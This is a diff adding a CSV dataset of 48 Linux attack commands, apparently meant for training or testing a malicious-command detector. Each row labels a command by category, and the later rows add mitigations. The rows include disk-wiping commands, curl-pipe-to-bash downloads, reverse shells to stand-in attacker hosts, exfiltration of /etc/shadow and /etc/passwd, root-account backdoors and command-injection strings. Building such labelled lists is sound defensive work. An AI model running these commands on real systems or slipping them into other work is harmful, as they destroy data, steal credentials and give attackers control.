@@ -1,0 +1,49 @@
+Command,Description,Platform,Category,Mitigation
+rm -rf /,Example of a destructive command command.,Linux,Destructive Command,
+dd if=/dev/zero of=/dev/sda,Example of a destructive command command.,Linux,Destructive Command,
+echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger,Example of a destructive command command.,Linux,Destructive Command,
+find / -name '*.txt' -exec rm {} \;,Example of a destructive command command.,Linux,Destructive Command,
+chmod 777 /etc/passwd,Example of a privilege escalation command.,Linux,Privilege Escalation,
+echo 'malicious-user:x:0:0:root:/root:/bin/bash' >> /etc/passwd,Example of a privilege escalation command.,Linux,Privilege Escalation,
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash malicious-user,Example of a privilege escalation command.,Linux,Privilege Escalation,
+ln -sf /bin/bash /tmp/sh && chmod u+s /tmp/sh,Example of a privilege escalation command.,Linux,Privilege Escalation,
+curl http://malicious.site/script.sh | bash,Example of a remote code execution command.,Linux,Remote Code Execution,
+wget http://malicious.site/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware,Example of a remote code execution command.,Linux,Remote Code Execution,
+echo 'malicious-payload' > /etc/cron.d/malware,Example of a persistence command.,Linux,Persistence,
+echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys,Example of a persistence command.,Linux,Persistence,
+chkconfig --level 3 malicious-service on,Example of a persistence command.,Linux,Persistence,
+iptables -F,Example of a defense evasion command.,Linux,Defense Evasion,
+systemctl stop firewalld,Example of a defense evasion command.,Linux,Defense Evasion,
+cat /etc/shadow,Example of a credential access command.,Linux,Credential Access,
+openssl passwd -1 -salt xyz password123,Example of a credential access command.,Linux,Credential Access,
+nc -e /bin/bash malicious.ip 4444,Example of a remote access command.,Linux,Remote Access,
+awk -F: '{print $1}' /etc/passwd,Gathers system information to aid further attacks.,Linux,Enumeration,Restrict access to sensitive files and logs.
+gcore -o /tmp/memory_dump $(pidof sshd),Extracts stored credentials from the system.,Linux,Credential Dumping,Encrypt stored credentials and restrict access.
+echo 'exploit' | sudo tee /etc/sudoers,Attempts to gain higher system privileges.,Linux,Privilege Escalation,Restrict sudo access and audit user privileges.
+sftp attacker@remote:/tmp/ <<< $'put /etc/passwd',Transfers sensitive data to a remote server.,Linux,Data Exfiltration,Monitor network traffic and block unauthorized transfers.
+grep 'password' /var/www/html/config.php,Gathers system information to aid further attacks.,Linux,Enumeration,Restrict access to sensitive files and logs.
+ls -lah /root/,Gathers system information to aid further attacks.,Linux,Enumeration,Restrict access to sensitive files and logs.
+socat TCP:attacker_ip:4444 EXEC:/bin/sh,Creates a remote shell controlled by an attacker.,Linux,Reverse Shell,Use firewall rules to block outgoing connections.
+chown root:root /bin/bash && chmod u+s /bin/bash,Attempts to gain higher system privileges.,Linux,Privilege Escalation,Restrict sudo access and audit user privileges.
+john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow,Extracts stored credentials from the system.,Linux,Credential Dumping,Encrypt stored credentials and restrict access.
+cat /var/log/auth.log | grep 'Failed password',Extracts stored credentials from the system.,Linux,Credential Dumping,Encrypt stored credentials and restrict access.
+touch /tmp/file; echo 'rm -rf /' > /tmp/file && bash /tmp/file,Injects malicious commands via input fields.,Linux,Command Injection,Sanitize user input and restrict shell execution.
+echo 'echo hacked > /etc/motd' >> /etc/rc.local,Ensures malware runs at every boot or login.,Linux,Persistence,Monitor startup files and restrict cron modifications.
+rsync -avz /home/user attacker@remote:/tmp/,Transfers sensitive data to a remote server.,Linux,Data Exfiltration,Monitor network traffic and block unauthorized transfers.
+strings /dev/mem | grep -i 'password',Extracts stored credentials from the system.,Linux,Credential Dumping,Encrypt stored credentials and restrict access.
+usermod -aG root attacker,Attempts to gain higher system privileges.,Linux,Privilege Escalation,Restrict sudo access and audit user privileges.
+systemctl enable malicious.service,Ensures malware runs at every boot or login.,Linux,Persistence,Monitor startup files and restrict cron modifications.
+'; curl http://malicious.com/malware.sh | sh #,Injects malicious commands via input fields.,Linux,Command Injection,Sanitize user input and restrict shell execution.
+$(wget -qO- http://malicious.com/script.sh | bash),Injects malicious commands via input fields.,Linux,Command Injection,Sanitize user input and restrict shell execution.
+scp -r /var/log attacker@remote:/tmp/,Transfers sensitive data to a remote server.,Linux,Data Exfiltration,Monitor network traffic and block unauthorized transfers.
+ping -c 4 127.0.0.1 && rm -rf /,Injects malicious commands via input fields.,Linux,Command Injection,Sanitize user input and restrict shell execution.
+echo 'echo pwned' > /etc/profile.d/hack.sh,Attempts to gain higher system privileges.,Linux,Privilege Escalation,Restrict sudo access and audit user privileges.
+curl -F 'file=@/etc/passwd' http://malicious.com/upload,Transfers sensitive data to a remote server.,Linux,Data Exfiltration,Monitor network traffic and block unauthorized transfers.
+echo '@reboot root /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /etc/crontab,Ensures malware runs at every boot or login.,Linux,Persistence,Monitor startup files and restrict cron modifications.
+ln -s /bin/bash /tmp/backdoor,Ensures malware runs at every boot or login.,Linux,Persistence,Monitor startup files and restrict cron modifications.
+cat /proc/cpuinfo,Gathers system information to aid further attacks.,Linux,Enumeration,Restrict access to sensitive files and logs.
+echo 'export PATH=/tmp/malicious:$PATH' >> ~/.bashrc,Ensures malware runs at every boot or login.,Linux,Persistence,Monitor startup files and restrict cron modifications.
+nc -w 3 attacker_ip 4444 < /etc/shadow,Transfers sensitive data to a remote server.,Linux,Data Exfiltration,Monitor network traffic and block unauthorized transfers.
+sudo -u root bash,Attempts to gain higher system privileges.,Linux,Privilege Escalation,Restrict sudo access and audit user privileges.
+dpkg -l | grep 'ssh',Gathers system information to aid further attacks.,Linux,Enumeration,Restrict access to sensitive files and logs.
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf,Creates a remote shell controlled by an attacker.,Linux,Reverse Shell,Use firewall rules to block outgoing connections.
